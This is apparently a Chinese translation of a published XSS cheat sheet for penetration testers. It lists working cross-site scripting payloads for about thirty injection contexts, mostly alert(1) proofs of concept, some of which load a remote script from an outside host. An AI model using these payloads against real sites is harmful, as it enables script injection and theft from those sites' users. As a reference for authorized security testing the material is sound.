# XSS_Cheat_Sheet_2020_Edition

## 简介
xss漏洞模糊测试有效载荷的最佳集合 2020版 <br>
该备忘清单可用于漏洞猎人，安全分析，渗透测试人员，根据应用的实际情况测试不同的payload，并观察响应内容，查找web应用的跨站点脚本漏洞，共计xxx条xss漏洞测试小技巧 <br>
本备忘录翻译自国外的XSS_Cheat_Sheet_2020_Edition.pdf议题，源文件可在本项目内直接下载 <br>

## 摘要
**1.基本** <br>
**2.高级** <br>
**3.绕过** <br>
**4.利用** <br>
**5.额外** <br>
**6.枚举** <br>

## 内容
**1.HTML Injection （代码注入）** <br>
当输入的payload，被插入到HTML标签或外部标签的属性值内时，则使用下面的方法进行测试，如果输入的内容被插入到了HTML注释，则在payload之前添加"->"
```
<svg onload=alert(1)>
"><svg onload=alert(1)>
```
**2.HTML Injection – Tag Block Breakout（HTML注入–标签闭合）** <br>
当输入的payload，被插入到以下标签的内部时，使用以下标签：<br>
`<title> <style> <script> <textarea> <noscript> <pre> <xmp> <iframe>` （`</tag>`为相应的html标签）。
```
</tag><svg onload=alert(1)>
"></tag><svg onload=alert(1)>
```
**3.HTML Injection - Inline （HTML注入-内联标签）** <br>
当输入的payload，被插入到HTML标签的属性值内，但该标签不能以大于号（>）进行闭合。<br>
```
"onmouseover=alert(1) //
"autofocus onfocus=alert(1) //
```
**4.HTML Injection - Source（HTML注入-源）** <br>
当输入的payload，被作为以下HTML标签属性的值使用时：`href`，`src`，`data`或`action`。payload中的`src`属性值可以是一个URL或者`"data:,alert(1)"`。
```
javascript:alert(1)
```
**5.Javascript Injection (javascript注入)** <br>
当输入的payload，被插入到javascript标签块中的字符串定界值中时使用。
```
'-alert(1)-'
'/alert(1)//
```
**6.Javascript Injection - Escape Bypass (javascript注入-绕过)** <br>
当输入的payload，被插入到javascript标签块字符串定界值中，但具有单引号，可以尝试使用反斜杠注释进行绕过。
```
\'/alert(1)//
```
**7.Javascript Injection – Script Breakout (javascript注入-脚本突破)** <br>
当输入的payload，被插入到javascript标签块中的任何位置时使用。
```
</script><svg onload=alert(1)>
```
**8.Javascript Injection - Logical Block (javscript注入-逻辑代码块)** <br>
当输入的payload，被插入到javascript标签块时，使用第一个或第二个payload，该值如果位于字符串分隔值或在单个逻辑代码块（如函数或条件（if，else，等等中）。 如果需要引用转义反斜杠，请使用第3个payload。
```
'}alert(1);{'
'}alert(1)%0A{'
\'}alert(1);{//
```
**9.Javascript Injection - Quoteless (javscript注入-无变量名)** <br>

当输入的payload在同一行javascript代码中有多次反射时使用。<br>
第一个payload适用于简单的javascript变量，第二个payload适用于非嵌套的javascript对象。 <br>
```
/alert(1)//\
/alert(1)}//\
```
**10.Javascript Context - Placeholder Injection in Template Literal (javascript注入-模板文字中的占位符注入)** <br>
当输入的payload被插入到反引号```（``）```分隔的字符串内或模板引擎中时使用。<br>
```
${alert(1)}
```
**11.Multi Reflection HTML Injection - Double Reflection (Single Input) (HTML注入多重反射-双重反射（单输入）)** <br>
payload用于利用同一页面上的多次反射。<br>
```
'onload=alert(1)><svg/1='
'>alert(1)</script><script/1='
*/alert(1)</script><script>/*
```
**12.Multi Reflection i HTML Injection - Triple Reflection (Single Input) (HTML注入多重反射-三次反射（单输入）)** <br>
payload用于利用同一页面上的多次反射。<br>
```
*/alert(1)">'onload="/*<svg/1='
`-alert(1)">'onload="`<svg/1='
*/</script>'>alert(1)/*<script/1='
```
**13.Multi Input Reflections HTML Injection - Double & Triple (HTML注入多输入反射-两次和三次)** <br>
payload用于利用同一页面上的多个输入反射。在HPP（HTTP参数污染）其中存在重复参数的反射。 第三个payload利用相同参数的逗号分隔进行反射。<br>
```
p=<svg/1='&q='onload=alert(1)>
p=<svg 1='&q='onload='/*&r=*/alert(1)'>
q=<script/&q=/src=data:&q=alert(1)>
```
**14.File Upload Injection – Filename (文件上传注入-文件名)** <br>
payload用于用户上传的文件名返回在目标页面的某处时使用。
```
"><svg onload=alert(1)>.gif
```
**15.File Upload Injection – Metadata (文件上传注入-元数据)** <br>
payload用于，当上传文件的元数据返回在目标页面中的某处时使用。 它可以使用命令行exiftool（"$"是终端提示），并且可以设置任何元数据字段。
```
$ exiftool -Artist='"><svg onload=alert(1)>' xss.jpeg
```
**16.File Upload Injection – SVG File (文件上传注入-SVG文件)** <br>
上传图像文件时，用于在目标上创建存储的XSS payload。 将以下内容另存为"xss.svg"文件 <br>
```
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
```
**17.DOM Insert Injection (DOM 注入)** <br>
当注入的payload作为有效标记插入DOM中，而不是反映在源代码中时，用于测试XSS。<br>
它适用于html标签和其他payload无效的情况下使用。<br>
```
<img src=1 onerror=alert(1)>
<iframe src=javascript:alert(1)>
<details open ontoggle=alert(1)>
<svg><svg onload=alert(1)>
```
**18.DOM Insert Injection – Resource Request (DOM 注入-资源请求)** <br>
当网站调用本地的javascript代码发送请求，并且将请求的结果插入到页面中时，如果攻击者可以控制该URL。则可以使用以下payload进行测试 <br>
```
data:text/html,<img src=1 onerror=alert(1)>
data:text/html,<iframe src=javascript:alert(1)>
```
**19.PHP Self URL Injection (PHP self URL注入)** <br>
当网站服务器端PHP代码，将当前URL当作HTML表单属性值进行获取。payload在斜杠（/）在php扩展名和查询部分的开始（？）之间插入。<br>
```
https://brutelogic.com.br/xss.php/"><svg onload=alert(1)>?a=reader
```
**20.Markdown Vector (Markdown 组件测试)**  <br>
在网站允许某些markdown标记，比如：输入的文本框，注释部分等中使用payload。点击触发。<br>
```
[clickme](javascript:alert`1`)
```
**21.Script Injection - No Closing Tag (脚本注入-没有结束标记)** <br>
payload在反射后的javascript代码中有结束脚本标签（</script>）时使用。 <br>
```
<script src=data:,alert(1)>
<script src=//brutelogic.com.br/1.js>
```
**22.Javascript postMessage() DOM Injection (with Iframe) (Javascript postMessage() DOM注入（带有Iframe）)** <br>
在JavaScript代码中有"message"事件监听器(如"window.addEventListener('message',...)")时使用该payload，并且服务器端没有检查来源。 如果能够对目标进行请求伪造（根据http请求 X-Frame Options标头）。 则另存一个HTML文件（或者使用data:text/html，以提供TARGET_URL和INJECTION（xss payload）进行测试。<br>
```
<iframe src=TARGET_URL onload="frames[0].postMessage('INJECTION','*')">
```
**23.XML-Based XSS (基于XML的XSS)** <br>
该payload用于在XML页面(内容类型为text/xml或application/xml）中进行测试。如果输入点位于注释部分，则在payload前添加"->"；如果输入位于CDATA部分，则将"->"添加payload。<br>
```
<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script>
<x:script xmlns:x="http://www.w3.org/1999/xhtml" src="//brutelogic.com.br/1.js"/>
```
**24.AngularJS Injections (v1.6 and up) (AngularJS注入(v1.6及更高版本))。** <br>
第一个payload用于在页面中，带有ng-app指令的HTML块中进行测试。<br>
第二个payload用于创建自己的AngularJS库时使用。<br>
```
{{$new.constructor('alert(1)')()}}
<x ng-app>{{$new.constructor('alert(1)')()}}
```
**25.Onscroll Universal Vector (通用Onscroll事件 测试payload)** <br>
使用onscroll事件处理web应用时，用户无需交互即可触发XSS漏洞。它与address, blockquote, body, center, dir, div, dl, dt, form, li, menu, ol, p, pre, ul,和h1到h6 HTML标签一起使用。 <br>
```
<p style=overflow:auto;font-size:999px onscroll=alert(1)>AAA<x/id=y></p>#y
```
**26.Type Juggling (类型戏法)** <br>
该payload用于在web应用不够严格对比匹配数字的"if"条件中使用。<br>
```
1<svg onload=alert(1)>
1"><svg onload=alert(1)>
```
**27.XSS in SSI (SSI中的XSS漏洞)** <br>
该payload在服务器端包含（SSI）注入时使用。<br>
```
<<!--%23set var="x" value="svg onload=alert(1)"--><!--%23echo var="x"-->>
```
**28.SQLi Error-Based XSS (基于sql显注的XSS)** <br>
该payload在可以触发SQL错误消息（带引号或反斜杠）的功能点中进行测试。<br>
```
'1<svg onload=alert(1)>
<svg onload=alert(1)>\
```
**29.Injection in JSP Path (JSP路径中的xss注入)** <br>
该payload可以在基于JSP的程序，测试应用的路径中使用。<br>
```
//DOMAIN/PATH/;<svg onload=alert(1)>
//DOMAIN/PATH/;"><svg onload=alert(1)>
```
**30.JS Injection - ReferenceError Fix (javascript注入-修复ReferenceError错误)** <br>
该payload用于修复一些javascript代码的语法。 通过查看浏览器开发人员工具（F12）中的"控制台"选项卡，是否有相应的ReferenceError，并相应地替换变量和函数名称进行测试。<br>
```
';alert(1);var myObj='
';alert(1);function myFunc(){}'
```
**31.Bootstrap Vector (up to v3.4.0) (Bootstrap最新版xss测试)** <br>
该payload用于web应用调用bootstrap库时进行测试。 href值的任何char都可以进行HTML编码，只需单击页面中的任意位置即可触发，并且绕过Webkit Auditor过滤器。 <br>
```
<html data-toggle=tab href="<img src=x onerror=alert(1)>">
```
**32.Browser Notification (浏览器通知)** <br>
以下payload用作alert()，prompt()和confirm()函数的替代方法。 如果用户已经触发第一个payload，就可以使用第二个payload进行测试。<br>
```
Notification.requestPermission(x=>{new(Notification)(1)})
new(Notification)(1)
```
**33.XSS in HTTP Header - Cached (HTTP请求头中-缓存xss)** <br>
该payload用于使用MISS-MISS-HIT缓存方案（如果服务器端开启）在应用程序中测试存储XSS。 将XSS标签替换为相应的payload，并将TARGET替换为虚拟字符串， 触发相同的请求3次，以避免页面的实际缓存信息。<br>
```
$ curl -H "Vulnerable_Header: <XSS>" TARGET/?dummy_string
```
****

## 致谢
**英文议题作者：** <br>
@brutelogic <br>
<br>
**中文翻译团队：**<br>
@farmsec <br>
@farmsec_alice <br>
@farmsec_lancet <br>
@farmsec_answer <br>

